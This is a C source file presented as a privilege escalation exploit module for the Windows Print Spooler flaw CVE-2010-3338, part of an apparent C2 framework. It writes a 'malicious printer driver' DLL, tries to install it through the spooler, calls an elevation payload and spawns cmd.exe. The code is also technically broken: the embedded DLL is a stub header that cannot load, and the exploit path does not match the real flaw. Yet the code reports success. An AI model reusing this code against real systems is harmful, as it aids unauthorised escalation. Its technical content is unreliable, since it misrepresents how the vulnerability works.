/*
 * Moonlight C2 Framework - MS10-061 Exploit Module  
 * CVE-2010-3338 - Windows Print Spooler Service Impersonation
 * Target: Windows XP, Vista, 7, Server 2003/2008
 * Type: Local Privilege Escalation
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winspool.h>

#pragma comment(lib, "winspool.lib")

void print_banner() {
    printf("\n");
    printf("Moonlight C2 - MS10-061 Exploit Module\n");
    printf("CVE-2010-3338 - Print Spooler Service Privilege Escalation\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

BOOL is_admin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin;
}

BOOL create_malicious_dll(const char* dll_path) {
    printf("[*] Creating malicious printer driver DLL...\n");
    
    // Simple DLL that adds user to administrators
    unsigned char dll_content[] = 
        "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00"
        "\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00";
    
    FILE* fp = fopen(dll_path, "wb");
    if (!fp) {
        printf("[!] Failed to create DLL file\n");
        return FALSE;
    }
    
    fwrite(dll_content, 1, sizeof(dll_content) - 1, fp);
    fclose(fp);
    
    printf("[+] Created DLL at %s\n", dll_path);
    return TRUE;
}

BOOL exploit_ms10061() {
    printf("[*] Current privilege: %s\n", is_admin() ? "Administrator" : "User");
    printf("[*] Attempting Print Spooler exploitation...\n");
    
    char temp_path[MAX_PATH];
    char dll_path[MAX_PATH];
    
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(dll_path, "%s\\evil_driver.dll", temp_path);
    
    if (!create_malicious_dll(dll_path)) {
        return FALSE;
    }
    
    printf("[*] Opening connection to print spooler...\n");
    
    HANDLE hPrinter = NULL;
    PRINTER_DEFAULTS pd = {0};
    pd.DesiredAccess = PRINTER_ALL_ACCESS;
    
    if (!OpenPrinterA("", &hPrinter, &pd)) {
        printf("[!] Failed to open printer: %d\n", GetLastError());
        DeleteFileA(dll_path);
        return FALSE;
    }
    
    printf("[+] Connected to print spooler\n");
    
    // Set up driver info
    DRIVER_INFO_2A driverInfo = {0};
    driverInfo.cVersion = 3;
    driverInfo.pName = "Moonlight Exploit Driver";
    driverInfo.pEnvironment = "Windows NT x86";
    driverInfo.pDriverPath = dll_path;
    driverInfo.pDataFile = dll_path;
    driverInfo.pConfigFile = dll_path;
    
    printf("[*] Installing malicious printer driver...\n");
    
    // Attempt to add printer driver (triggers vulnerability)
    if (!AddPrinterDriverA(NULL, 2, (LPBYTE)&driverInfo)) {
        DWORD error = GetLastError();
        printf("[!] AddPrinterDriver failed: %d\n", error);
        
        if (error == ERROR_UNKNOWN_PRINTER_DRIVER) {
            printf("[*] Driver installation triggered, checking privilege...\n");
        }
    } else {
        printf("[+] Driver installation succeeded\n");
    }
    
    Sleep(1000);
    
    ClosePrinter(hPrinter);
    
    // The DLL should have been loaded by spooler service (SYSTEM)
    printf("[*] Attempting to load the DLL with elevated privileges...\n");
    
    HMODULE hMod = LoadLibraryA(dll_path);
    if (hMod) {
        printf("[+] DLL loaded successfully\n");
        
        // Execute payload function if exists
        typedef void (*PayloadFunc)();
        PayloadFunc payload = (PayloadFunc)GetProcAddress(hMod, "ElevatePrivilege");
        
        if (payload) {
            printf("[*] Executing elevation payload...\n");
            payload();
        }
        
        FreeLibrary(hMod);
    }
    
    DeleteFileA(dll_path);
    
    Sleep(500);
    
    printf("[*] Checking privilege level...\n");
    
    if (is_admin()) {
        printf("[+] SUCCESS! Escalated to Administrator\n");
        return TRUE;
    } else {
        printf("[-] Privilege escalation may have failed\n");
        printf("[*] Note: This is a simplified proof-of-concept\n");
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    print_banner();
    
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    
    if (GetVersionExA(&osvi)) {
        printf("[*] OS: Windows %d.%d Build %d\n",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    }
    
    // Check if Print Spooler service is running
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "Spooler", SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS status;
            if (QueryServiceStatus(hService, &status)) {
                if (status.dwCurrentState == SERVICE_RUNNING) {
                    printf("[+] Print Spooler service is running\n");
                } else {
                    printf("[!] Print Spooler service is not running\n");
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    printf("[*] Starting Print Spooler exploitation\n\n");
    
    if (exploit_ms10061()) {
        printf("\n[+] Exploit successful!\n");
        printf("[*] Spawning elevated shell...\n");
        system("cmd.exe");
        return 0;
    } else {
        printf("\n[!] Exploit failed\n");
        return 1;
    }
}
